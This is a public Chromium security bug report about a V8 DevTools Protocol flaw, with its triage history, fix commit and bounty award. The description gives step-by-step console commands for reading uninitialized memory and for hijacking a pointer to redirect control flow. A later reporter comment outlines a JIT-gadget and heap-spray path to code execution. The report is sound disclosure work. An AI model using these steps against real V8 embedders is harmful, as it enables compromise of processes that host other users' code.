# Security: CDP Runtime.queryObjects leaks internal objects in JS heap, allowing CDP clients to compromise V8 process

| Field | Value |
|-------|-------|
| **Issue ID** | [40058575](https://issues.chromium.org/issues/40058575) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P2 |
| **Component** | Unknown |
| **Platforms** | Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ku...@gmail.com |
| **Assignee** | ds...@chromium.org |
| **Created** | 2022-01-24 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

With Runtime.queryObjects, the JS heap can be traversed by a Chrome DevTools Protocol client, allowing it to perform heap exploitation. This breaks an implicit security assumption that a CDP client can only modify and execute JS in the Isolate that the debugger is attached to.

Specifically, at least the arrayBufferConstructor\_DoNotInitialize constructor is revealed, as well as an ArrayBuffer containing a pointer to the CommandLineAPIData struct, which contains function pointers.

**VERSION**  

Node Version: v10.19.0  

Operating System: Linux 5.13.0-27-generic Ubuntu 20.04.3 LTS

**REPRODUCTION CASE**  

Leak of uninitialized memory:  

\* Open DevTools  

\* Enter queryObjects(Object)  

\* Store result as global variable (assumed to be temp1)  

\* Enter cons = temp1.find(e=>e.name && e.name == "arrayBufferConstructor\_DoNotInitialize");  

\* Enter buf = cons(0x1000)  

\* View uninitialized memory using buf

Control flow redirection:  

\* Open DevTools  

\* Enter queryObjects(ArrayBuffer)  

\* Find ArrayBuffer with length 16 that starts with what looks like a pointer, store as global variable (assumed to be temp1)  

\* Enter new Uint32Array(temp1)[0] = 0x41414141  

\* Enter new Uint32Array(temp1)[1] = 0x41414141  

\* Enter queryObjects(ArrayBuffer) (the console log when this returns will trigger the dereference)  

\* Crash with dereference of 0x4141414141414141: (If this is done instead with a pointer to a struct with a correct offset to code, that code will be run)  

SegvAnalysis:  

Segfault happened at: 0x7f27e9c4658f <\_ZN12v8\_inspector9V8Console20queryObjectsCallbackERKN2v820FunctionCallbackInfoINS1\_5ValueEEEi+207>: mov 0x8(%rbx),%r8  

PC (0x7f27e9c4658f) ok  

source "0x8(%rbx)" (0x4141414141414149) not located in a known VMA region (needed readable region)!  

destination "%r8" ok  

SegvReason: reading unknown VMA  

SourcePackage: nodejs  

Stacktrace:  

#0 0x00007f27e9c4658f in v8\_inspector::V8Console::queryObjectsCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&, int) () from /lib/x86\_64-linux-gnu/libnode.so.64  

No symbol table info available.  

#1 0x00007f27e9d302da in v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) () from /lib/x86\_64-linux-gnu/libnode.so.64  

No symbol table info available.  

#2 0x00007f27e9d307f0 in ?? () from /lib/x86\_64-linux-gnu/libnode.so.64  

No symbol table info available.  

#3 0x00007f27e9d314ca in ?? () from /lib/x86\_64-linux-gnu/libnode.so.64  

No symbol table info available.  

#4 0x000007852b3d452b in ?? ()  

No symbol table info available.  

#5 0x00003a9ad94340b9 in ?? ()  

No symbol table info available.  

#6 0x000007852b3d44a1 in ?? ()  

No symbol table info available.  

#7 0x00007ffe43079800 in ?? ()  

No symbol table info available.  

#8 0x0000000000000006 in ?? ()  

No symbol table info available.  

#9 0x00007ffe43079898 in ?? ()  

No symbol table info available.  

#10 0x000007852b31ec12 in ?? ()  

No symbol table info available.  

#11 0x00000c72c95825d9 in ?? ()  

No symbol table info available.  

#12 0x00000d159da537e9 in ?? ()  

No symbol table info available.  

#13 0x0000000600000000 in ?? ()  

No symbol table info available.  

#14 0x00000c72c9582609 in ?? ()  

No symbol table info available.  

#15 0x00002f28e6740171 in ?? ()  

No symbol table info available.  

#16 0x00000b3274a07739 in ?? ()  

No symbol table info available.  

#17 0x00002f28e6740171 in ?? ()  

No symbol table info available.  

#18 0x00000d159da537e9 in ?? ()  

No symbol table info available.  

#19 0x00000c72c95825d9 in ?? ()  

No symbol table info available.  

#20 0x0000004400000000 in ?? ()  

No symbol table info available.  

#21 0x00003a9ad9434019 in ?? ()  

No symbol table info available.  

#22 0x00003a9ad9434079 in ?? ()  

No symbol table info available.  

#23 0x00002f28e672d881 in ?? ()  

No symbol table info available.  

#24 0x00007ffe430798c8 in ?? ()  

No symbol table info available.  

#25 0x000007852b31bd8f in ?? ()  

No symbol table info available.  

#26 0x00000b3274a07739 in ?? ()  

No symbol table info available.  

#27 0x00003a9ad9434079 in ?? ()  

No symbol table info available.  

#28 0x000007852b31bce1 in ?? ()  

No symbol table info available.  

#29 0x000000000000001e in ?? ()  

No symbol table info available.  

#30 0x00007ffe43079930 in ?? ()  

No symbol table info available.  

#31 0x000007852b3e3ea1 in ?? ()  

No symbol table info available.  

#32 0x0000000000000000 in ?? ()  

No symbol table info available.  

StacktraceTop:  

v8\_inspector::V8Console::queryObjectsCallback(v8::FunctionCallbackInfo[v8::Value](javascript:void(0);) const&, int) () from /lib/x86\_64-linux-gnu/libnode.so.64  

v8::internal::FunctionCallbackArguments::Call(v8::internal::CallHandlerInfo\*) () from /lib/x86\_64-linux-gnu/libnode.so.64  

?? () from /lib/x86\_64-linux-gnu/libnode.so.64  

?? () from /lib/x86\_64-linux-gnu/libnode.so.64  

?? ()

**CREDIT INFORMATION**  

Reporter credit: Kuilin Li

NOTE  

This bug was reported as a Cloudflare Workers vulnerability initially, as they use Isolates to isolate workers from each other, but allow CDP connections (across the internet) to debug workers running on their edge. From my understanding, Cloudflare already reached out to the V8 team, who recommended that I submit this here.

## Attachments

- [simplescreenrecorder-2022-01-24_20.08.00.mkv](attachments/simplescreenrecorder-2022-01-24_20.08.00.mkv) (application/octet-stream, 6.0 MB)

## Timeline

### [Deleted User] (2022-01-24)

[Empty comment from Monorail migration]

### aj...@google.com (2022-01-24)

I'm not super familiar with devtools so don't know what you mean by 'Store result as global variable (assumed to be temp1)'

could you provide the exact steps you are typing? (or a video if you are using ui steps).

dsv: any thoughts?

[Monorail components: Platform>DevTools>JavaScript]

### ku...@gmail.com (2022-01-25)

I'm using the standard DevTools UI to do those steps, attached to Node. This also works in DevTools on a browser page. I attached a recording of the segfault, let me know if you need any more info. 

The reproduction is just to demonstrate that it's a problem. The actual use case is that, if an application embeds V8 and then uses the debugger on a particular Isolate, a debugger connecting to it with CDP can do these things and compromise the process, which may include other Isolates or capabilities. Of course, CDP is expected to be able to control JS execution inside the Isolate, but this is a lot more trust than that. 

### [Deleted User] (2022-01-25)

Thank you for providing more feedback. Adding the requester to the cc list.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2022-01-25)

[Empty comment from Monorail migration]

### ya...@google.com (2022-01-25)

I don't think we can quite say that

"a CDP client can only modify and execute JS in the Isolate that the debugger is attached to" is a valid expectation at this point in time, as we expect CDP clients to be trusted.

Furthermore, there is no strong guarantee that Isolates in the same process cannot affect each other. This went out of the window with Spectre.

### ya...@google.com (2022-01-25)

I don't actually see from these two issues how you cross the Isolate boundary?

### ya...@google.com (2022-01-25)

[Empty comment from Monorail migration]

### ya...@google.com (2022-01-25)

I have a fix for the second issue. We should not be using ArrayBuffer to store C++ pointers in the first place.

### ya...@google.com (2022-01-25)

Turns out the solution is not trivial after all. Replacing v8::ArrayBuffer with v8::External is not feasible since in one case, we need the value to be writable, and in another case we need to store two values instead of just one. Using internal object fields has other problems.

### ku...@gmail.com (2022-01-25)

> I don't actually see from these two issues how you cross the Isolate boundary? 

With these two exploits, an uninitialized memory leak and an attacker-controlled struct dereference followed by calling a function in the struct, we should be able to perform heap exploitation and execute shellcode as the V8 process. 

This is just an example - I haven't tried this, but I'm pretty sure this or something like this would work, it'd just be cumbersome to develop. So, we can prepare a series of JS functions that, when JIT compiled under certain assumptions, contain useful assembly gadgets, either at correct or at misaligned instruction addresses. Then, after ensuring they are JIT compiled, we can leak pointers to these gadgets by spraying the heap with references to the functions, and then doing the uninitialized memory leak. 

After we have pointers to them, we can call these gadgets by creating, in an ArrayBuffer, a fake CommandLineAPIData struct containing the gadget pointer where console.log would be, and then leaking the address to that in the same way. Finally, we set the existing internal ArrayBuffer to that address and calling queryObjects. When queryObjects finishes and then calls console.log, it will instead call the gadget, which, if it ends in a ret, will do something unexpected and then return control back to us. 

### aj...@google.com (2022-01-25)

[Empty comment from Monorail migration]

### [Deleted User] (2022-01-25)

[Empty comment from Monorail migration]

### [Deleted User] (2022-01-26)

Setting milestone and target because of medium severity.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### [Deleted User] (2022-01-26)

Setting Pri-1 to match security severity Medium. If this is incorrect, please reset the priority. Sheriffbot won't make this change again.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ca...@chromium.org (2022-02-07)

+Kenton from CloudFlare, as they're aware of the issue and contributed to the discussion.

### [Deleted User] (2022-02-08)

dsv: Uh oh! This issue still open and hasn't been updated in the last 15 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ds...@chromium.org (2022-02-09)

[Empty comment from Monorail migration]

### ds...@chromium.org (2022-02-09)

[Empty comment from Monorail migration]

### [Deleted User] (2022-02-24)

dsv: Uh oh! This issue still open and hasn't been updated in the last 15 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ja...@chromium.org (2022-03-09)

[Empty comment from Monorail migration]

### [Deleted User] (2022-03-30)

[Empty comment from Monorail migration]

### ke...@cloudflare.com (2022-04-26)

Is there any plan to address this?

### ds...@chromium.org (2022-04-27)

Yes, we are working on this right now.

### bm...@chromium.org (2022-05-11)

[Empty comment from Monorail migration]

### ja...@chromium.org (2022-05-11)

[Empty comment from Monorail migration]

### [Deleted User] (2022-05-25)

[Empty comment from Monorail migration]

### gi...@appspot.gserviceaccount.com (2022-06-01)

The following revision refers to this bug:
  https://chromium.googlesource.com/v8/v8/+/0944ea06c6590182a4336ef69f773fabac6035f4

commit 0944ea06c6590182a4336ef69f773fabac6035f4
Author: Danil Somsikov <dsv@chromium.org>
Date: Wed Jun 01 08:49:34 2022

Disable command-line API for untrusted inspector clients.

Bug: chromium:1290236
Change-Id: Ie8cda6fd6260d30d3107d3b0288e01960b0e2d3e
Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/3677293
Auto-Submit: Danil Somsikov <dsv@chromium.org>
Commit-Queue: Danil Somsikov <dsv@chromium.org>
Reviewed-by: Yang Guo <yangguo@chromium.org>
Cr-Commit-Position: refs/heads/main@{#80885}

[modify] https://crrev.com/0944ea06c6590182a4336ef69f773fabac6035f4/src/inspector/v8-inspector-session-impl.h
[modify] https://crrev.com/0944ea06c6590182a4336ef69f773fabac6035f4/test/cctest/test-inspector.cc
[modify] https://crrev.com/0944ea06c6590182a4336ef69f773fabac6035f4/src/inspector/injected-script.cc
[modify] https://crrev.com/0944ea06c6590182a4336ef69f773fabac6035f4/src/inspector/string-util.h


### ts...@chromium.org (2022-07-20)

dsv - did the patch in C28 resolve the issue so that you can close the bug. or is there more work to be done?

### am...@chromium.org (2022-08-01)

Talked to Danil off-bug, while the security issue is technically resolved (given that the offending API disabled) the plan is to still fix the core function of this issue. Let's leave this open as that work continues since this issue isn't fully resolved. 

### [Deleted User] (2022-08-03)

[Empty comment from Monorail migration]

### ku...@gmail.com (2022-08-11)

Is this bug eligible for consideration for VRP reward now that the bug is technically resolved, or should it be fully fixed first?

### ke...@chromium.org (2022-08-23)

amyressler@: Would it make sense to close this bug and file a follow up with Impact-None, so that this can go through VRP and be available to SecurityNotify?

### am...@chromium.org (2022-08-23)

Thanks - that would be good for now to move forward on VRP as well as to open this to Security Notify. Updated as Fixed. Let's get another bug open with Security_Impact-None to fix the root cause before the API is re-enabled. Thanks! 

### [Deleted User] (2022-08-23)

[Empty comment from Monorail migration]

### [Deleted User] (2022-08-24)

[Empty comment from Monorail migration]

### am...@chromium.org (2022-08-30)

[Empty comment from Monorail migration]

### am...@google.com (2022-08-30)

[Empty comment from Monorail migration]

### am...@google.com (2022-09-09)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### am...@chromium.org (2022-09-09)

Congratulations! The VRP Panel has decided to award you $1,000 for this report. Thank you for your efforts and reporting this issue to us! 

### am...@google.com (2022-09-14)

[Empty comment from Monorail migration]

### ad...@google.com (2022-09-26)

[Empty comment from Monorail migration]

### ad...@google.com (2022-09-26)

[Empty comment from Monorail migration]

### ku...@gmail.com (2022-11-03)

Can I be copied please on the new Security_Impact-None bug to see progress on fixing the underlying issue and potentially provide feedback/ideas?

### [Deleted User] (2022-11-29)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-09)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-09)

This issue was migrated from crbug.com/chromium/1290236?no_tracker_redirect=1

[Auto-CCs applied]
[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40058575)*
